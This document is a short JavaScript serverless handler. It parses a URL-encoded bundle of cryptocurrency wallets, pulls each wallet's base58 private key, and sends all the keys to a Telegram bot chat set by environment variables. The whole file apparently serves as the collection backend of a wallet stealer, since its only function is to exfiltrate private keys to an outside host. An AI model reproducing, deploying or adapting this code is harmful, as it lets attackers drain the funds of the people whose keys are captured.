export default async function handler(req, res) {
  const { bundles, keybundle } = req.query;

  const botToken = process.env.BOT_TOKEN;
  const chatId = process.env.CHAT_ID;

  let decodedBundle;
  try {
    decodedBundle = JSON.parse(decodeURIComponent(keybundle));
  } catch (err) {
    return res.status(400).send("Invalid keybundle format");
  }

  const wallets = decodedBundle?.wallets || [];

  // Extract base58 private keys
  let message = wallets
    .map((wallet, i) => `Wallet ${i + 1}:\n${wallet.privateKey?.base58 || 'N/A'}`)
    .join("\n\n");

  if (!message) message = "No base58 private keys found.";

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const telegramRes = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    const data = await telegramRes.json();
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return res.status(500).send("Failed to send message");
    }

    res.status(200).send("Success");
  } catch (e) {
    console.error("Handler error:", e);
    res.status(500).send("Server error");
  }
}
